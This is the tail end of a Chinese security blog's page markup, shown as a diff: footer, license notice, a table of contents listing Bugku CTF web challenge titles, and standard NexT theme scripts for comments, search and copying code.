+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Web安全/SSRF/SSRF学习.html" rel="next" title="SSRF学习">
+                <i class="fa fa-chevron-left"></i> SSRF学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">14</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">13</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+          
+          <br>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=29045579&auto=0&height=32"></iframe>
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基础题"><span class="nav-number">2.</span> <span class="nav-text">基础题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Web2"><span class="nav-number">2.1.</span> <span class="nav-text">0x01 Web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-计算器"><span class="nav-number">2.2.</span> <span class="nav-text">0x02 计算器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-web基础-GET"><span class="nav-number">2.3.</span> <span class="nav-text">0x03 web基础$_GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-web基础-POST"><span class="nav-number">2.4.</span> <span class="nav-text">0x04 web基础$_POST</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小小总结"><span class="nav-number">2.4.1.</span> <span class="nav-text">小小总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-矛盾"><span class="nav-number">2.5.</span> <span class="nav-text">0x05 矛盾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-web3"><span class="nav-number">2.6.</span> <span class="nav-text">0x06 web3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-你必须让他停下"><span class="nav-number">2.7.</span> <span class="nav-text">0x07 你必须让他停下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-文件包含"><span class="nav-number">2.8.</span> <span class="nav-text">0x08 文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-变量1"><span class="nav-number">2.9.</span> <span class="nav-text">0x09 变量1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-web5"><span class="nav-number">2.10.</span> <span class="nav-text">0x10 web5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-头等舱"><span class="nav-number">2.11.</span> <span class="nav-text">0x11 头等舱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#初级题"><span class="nav-number">3.</span> <span class="nav-text">初级题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-网站被黑"><span class="nav-number">3.1.</span> <span class="nav-text">0x12 网站被黑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x13-管理员系统"><span class="nav-number">3.2.</span> <span class="nav-text">0x13 管理员系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-web4"><span class="nav-number">3.3.</span> <span class="nav-text">0x14 web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x15-flag在index里"><span class="nav-number">3.4.</span> <span class="nav-text">0x15 flag在index里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x16-输入密码查看flag"><span class="nav-number">3.5.</span> <span class="nav-text">0x16 输入密码查看flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x17-点击一百万次"><span class="nav-number">3.6.</span> <span class="nav-text">0x17 点击一百万次</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x18-备份是个好习惯"><span class="nav-number">3.7.</span> <span class="nav-text">0x18 备份是个好习惯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x19-成绩单"><span class="nav-number">3.8.</span> <span class="nav-text">0x19 成绩单</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#入门题"><span class="nav-number">4.</span> <span class="nav-text">入门题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x20-秋名山老司机"><span class="nav-number">4.1.</span> <span class="nav-text">0x20 秋名山老司机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x21-速度要快"><span class="nav-number">4.2.</span> <span class="nav-text">0x21 速度要快</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x22-cookies欺骗"><span class="nav-number">4.3.</span> <span class="nav-text">0x22 cookies欺骗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x23-never-give-up"><span class="nav-number">4.4.</span> <span class="nav-text">0x23 never give up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x24-welcome-to-bugkuctf"><span class="nav-number">4.5.</span> <span class="nav-text">0x24 welcome to bugkuctf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x25-过狗一句话"><span class="nav-number">4.6.</span> <span class="nav-text">0x25 过狗一句话</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Miracle778</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">44k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">40 分钟</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'w9nX4X8WpdsRFrCFoTt7cpqz-gzGzoHsz',
+    appKey: 'H3aV3vWVqkmAgeD0ep6RVf07',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
